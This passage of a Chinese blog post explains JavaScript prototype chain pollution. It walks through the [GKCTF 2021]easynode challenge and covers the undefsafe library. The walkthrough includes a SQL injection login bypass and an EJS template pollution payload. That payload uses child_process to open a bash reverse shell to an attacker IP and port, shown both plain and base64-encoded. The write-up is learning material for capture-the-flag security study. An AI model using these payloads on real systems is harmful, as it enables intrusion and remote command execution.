+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/addAdmin&quot;</span>,<span class="title function_">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        gift = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; [username]:&#123;<span class="attr">name</span>:<span class="string">&quot;Blue-Eyes White Dragon&quot;</span>,<span class="attr">ATK</span>:<span class="string">&quot;3000&quot;</span>,<span class="attr">DEF</span>:<span class="string">&quot;2500&quot;</span>,<span class="attr">URL</span>:<span class="string">&quot;https://ftp.bmp.ovh/imgs/2021/06/f66c705bd748e034.jpg&quot;</span>&#125;&#125;);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO test (username, password) VALUES (&quot;&#123;&#125;&quot;,&quot;&#123;&#125;&quot;) &#x27;</span>,username,password);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO board (username, board) VALUES (\&#x27;&#123;&#125;\&#x27;,\&#x27;&#123;&#125;\&#x27;) &#x27;</span>,username,gift);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;add admin successful!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;stop!!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>在/addAdmin中可以以POST传参的方式来添加username</p>
+<p>前提是知道一个管理员的token</p>
+<p><strong>推算原管理员的账号与密码，一次来获得原管理员的token。</strong></p>
+<p>对于safeQuery函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">safeQuery</span> =  <span class="keyword">async</span> (<span class="params">username,password</span>)=&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">waf</span> = (<span class="params">str</span>)=&gt;&#123;</span><br><span class="line">        <span class="comment">// console.log(str);</span></span><br><span class="line">        blacklist = [<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line">        blacklist.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (str == element)&#123;</span><br><span class="line">                str = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">safeStr</span> = (<span class="params">str</span>)=&gt;&#123; <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(str[i]) ==<span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            str =   str.<span class="title function_">slice</span>(<span class="number">0</span>, i) +<span class="string">&quot;*&quot;</span> + str.<span class="title function_">slice</span>(i + <span class="number">1</span>, str.<span class="property">length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = <span class="title function_">safeStr</span>(username);</span><br><span class="line">    password = <span class="title function_">safeStr</span>(password);</span><br><span class="line">    <span class="keyword">let</span> sql = <span class="title function_">format</span>(<span class="string">&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;</span>,username.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>),password.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">    <span class="comment">// console.log(sql);</span></span><br><span class="line">    result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql)));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>简言之就是会把username和password中的\ ^ ( ) &quot; ‘字符换成*<br />
+然后执行sql查询语句。<br />
+那么如果查询的username为admin’#就可以使result为true。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[]=admin&#x27;#&amp;username=1&amp;username=1&amp;username=1&amp;username=1&amp;username=1&amp;username=(&amp;password=123456</span><br></pre></td></tr></table></figure>
+<p>为什么中间要填那么多1：如果中间字符太少遍历完数组后又依次遍历每个字符，导致单引号被替换成星号</p>
+<p>为什么 username 数组的长度需要一定长，没有达到一定长就无法成功登录</p>
+<p>这样之后SQL语句就变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where username = &#x27;admin&#x27;#,1,1,1,1,1,1,1,1,1*&#x27; and password = &#x27;123456&#x27;</span><br></pre></td></tr></table></figure>
+<p>因此 password 被注释了，所以直接就登陆了，然后回显 token ，</p>
+<p><img src="../images/20250617215437545.png" alt="image-20250617215437545" /></p>
+<p>拿到token</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjpbImFkbWluJyMiLCIxIiwiMSIsIjEiLCIxIiwiMSIsIigiXSwiZXhwIjoxNzEyMjEyMjA0LCJpYXQiOjE3MTIyMTA0MDR9.soio89HKdjUfET8vioMkBjNsu8u19QgHd1WwpGMRHFQ</span><br></pre></td></tr></table></figure>
+<h4 id="添加管理员"><a class="markdownIt-Anchor" href="#添加管理员"></a> <strong>添加管理员</strong></h4>
+<p><img src="../images/20250617215503766.png" alt="image-20250617215503766" /></p>
+<p>再次用<code>__proto__</code>的身份登录</p>
+<p><img src="../images/20250617215533119.png" alt="image-20250617215533119" /></p>
+<p>获得token</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiX19wcm90b19fIiwiZXhwIjoxNzEyMjEyNjIwLCJpYXQiOjE3MTIyMTA4MjB9.Vw0sGdUA8PGVBz2RRbl40h88WTGv97na5KWRqnr2qeI</span><br></pre></td></tr></table></figure>
+<h4 id="污染"><a class="markdownIt-Anchor" href="#污染"></a> <strong>污染</strong></h4>
+<p>来到/adminDIV</p>
+<p>传参data前先进行base64加密与url加密，防止出现编码问题。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>公网地址和端口加密后为</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjAuMjYuMTE1LjIwOS85MDAzIDA%2BJjEi|base64 -d|bash&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250617215619834.png" alt="image-20250617215619834" /></p>
+<p>最后以<code>__proto__</code>身份登录，即可<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=241623489&amp;content_type=Article&amp;match_order=1&amp;q=%E5%8F%8D%E5%BC%B9shell&amp;zhida_source=entity">反弹shell</a>。</p>
+<h2 id="ejs和jade模板引擎rce"><a class="markdownIt-Anchor" href="#ejs和jade模板引擎rce"></a> EJS和Jade模板引擎RCE</h2>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236354#h2-2">关于nodejs的ejs和jade模板引擎的原型链污染挖掘-安全KER - 安全资讯平台</a></p>
+<h2 id="lodash-原型链污染"><a class="markdownIt-Anchor" href="#lodash-原型链污染"></a> Lodash 原型链污染</h2>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170#h2-0">从 Lodash 原型链污染到模板 RCE-安全KER - 安全资讯平台</a></p>
+<p>例题看NSS 2nd</p>
+<h2 id="undefsafe原型链污染"><a class="markdownIt-Anchor" href="#undefsafe原型链污染"></a> undefsafe原型链污染</h2>
+<p>当我们访问一个对象不存在的属性时，会报错然后退出程序，undefsafe帮我们解决了这个问题</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">c</span>.<span class="property">e</span>);</span><br><span class="line"><span class="comment">//Uncaught TypeError TypeError: Cannot read properties of undefined (reading &#x27;e&#x27;)</span></span><br><span class="line"><span class="comment">//错误并退出程序</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">undefsafe</span>(object,<span class="string">&quot;a.c.e&quot;</span>));<span class="comment">//undefinedTYPESCRIPT</span></span><br></pre></td></tr></table></figure>
+<p>为一个不存在的属性赋值时，会在其上层赋值</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">undefsafe</span>(object,<span class="string">&#x27;a.c.name&#x27;</span>,<span class="string">&#x27;xianbei&#x27;</span>);</span><br><span class="line"><span class="comment">//undefsafe(object,&#x27;a.name&#x27;,&#x27;xianbei&#x27;);   //直接a.name结果也是一样的</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">&#123; <span class="attr">a</span>: </span><br><span class="line">	&#123; <span class="attr">b</span>: </span><br><span class="line">		&#123; <span class="attr">c</span>: <span class="number">1</span>, </span><br><span class="line">		<span class="attr">d</span>: [<span class="title class_">Array</span>], </span><br><span class="line">		<span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span> </span><br><span class="line">		&#125;, </span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;xianbei&#x27;</span>      <span class="comment">//name与b是同一级</span></span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那很明显利用方式就是<code>__proto__</code> 进行原型链污染</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">undefsafe</span>(object,<span class="string">&#x27;__proto__.name&#x27;</span>,<span class="string">&#x27;xianbei&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">name</span>);<span class="comment">//xianbei</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">JS原型链污染</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="TGCTF比赛复现" class="lazyload">
+        
+        <a href="/2025/04/12/TGCTF%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            TGCTF比赛复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[SWPUCTF 2016]Web7" class="lazyload">
+      
+      <a href="/2025/04/10/%5BSWPUCTF%202016%5DWeb7/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [SWPUCTF 2016]Web7
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.</span> <span class="toc-text"> JS创建对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text"> JS原型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text"> 基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#__proto__%E5%92%8Cprototype"><span class="toc-number">2.2.</span> <span class="toc-text"> __proto__和prototype</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-prototype%E6%98%BE%E5%BC%8F%E5%8E%9F%E5%9E%8B"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 1. prototype（显式原型）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-__proto__%E9%9A%90%E5%BC%8F%E5%8E%9F%E5%9E%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 2. __proto__（隐式原型）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text"> JS原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E4%B8%AD%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF%E6%9C%BA%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text"> JS中类的继承机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text"> 漏洞思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text"> 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text"> 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">5.1.</span> <span class="toc-text"> JS大小写特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">6.</span> <span class="toc-text"> Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%AF%BC%E8%87%B4%E7%9A%84ejs%E6%A8%A1%E6%9D%BFrce"><span class="toc-number">7.</span> <span class="toc-text"> 污染导致的ejs模板rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gkctf-2021easynode-extend%E5%AF%BC%E8%87%B4%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">7.1.</span> <span class="toc-text"> [GKCTF 2021]easynode （extend导致原型链污染）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#key%E7%9A%84%E5%80%BC"><span class="toc-number">7.1.1.</span> <span class="toc-text"> key的值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#username%E7%9A%84%E5%80%BC"><span class="toc-number">7.1.2.</span> <span class="toc-text"> username的值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">7.1.3.</span> <span class="toc-text"> 添加管理员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93"><span class="toc-number">7.1.4.</span> <span class="toc-text"> 污染</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ejs%E5%92%8Cjade%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8Erce"><span class="toc-number">8.</span> <span class="toc-text"> EJS和Jade模板引擎RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lodash-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">9.</span> <span class="toc-text"> Lodash 原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefsafe%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">10.</span> <span class="toc-text"> undefsafe原型链污染</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "JS原型链污染",
+          url: "http://example.com/2025/04/11/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
+          excerpt: "",
+          description: "",
+          stripContent: "学习JavaScript这一篇就够了-CSDN博客 js学习 js原型链污染（原理+分析+例题） - 知乎 JavaScript 原型链污染 | Drunkbaby’s Blog(推荐)  JS创建对象 有三种方式： 12345678910111213141516//普通方式var a = &amp;#123;name:&amp;#x27;pan&amp;#x27;,age:19&amp;#125;;//构造函数方式function a()&amp;#123;    this.name = &amp;#x27;pan&amp;#x27;;// 实例属",
+          date: "Fri Apr 11 2025 14:10:26 GMT+0800",
+          updated: "Sat Apr 18 2026 15:45:46 GMT+0800",
